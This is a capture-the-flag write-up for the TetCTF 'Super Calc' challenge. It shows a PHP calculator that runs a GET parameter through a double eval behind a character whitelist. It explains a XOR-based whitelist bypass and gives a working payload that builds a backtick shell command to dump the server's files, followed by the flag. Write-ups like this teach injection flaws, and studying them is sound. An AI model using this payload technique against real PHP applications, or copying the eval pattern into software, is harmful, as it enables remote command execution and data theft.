# Super Calc
> Let try on the next-generation, the superior Calculator that support many operations, made with love <3

Relevant code:
```php
$wl = preg_match('/^[0-9\+\-\*\/\(\)\'\.\~\^\|\&]+$/i', $_GET["calc"]);
if($wl === 0 || strlen($_GET["calc"]) > 70) die(...);
eval("echo ".eval("return ".$_GET["calc"].";").";");
```

Visiting the URL without a query parameter gives us the source of the challenge. Our code is double eval'd and the result printed. Our input can be up to 70 characters and can only use characters in the set `0123456789+-*/().~|&^`. We can create arbitrary characters by xoring strings and join them using `.`.

We don't have a lot of space, but it's plenty to encode backticks (shell command) and a two letter command that reads files like `hd` then a wildcard `*`.

```
`hd *`
('0'^'.'^'~').('6'^'^').('0'^'*'^'~').('~'^'^').'*'.('0'^'.'^'~')
Length: 65

TetCTF{_D0_Y0u_Know_H0w_T0_C4lculat3_1337?_viettel_*100*817632506233949#}
```
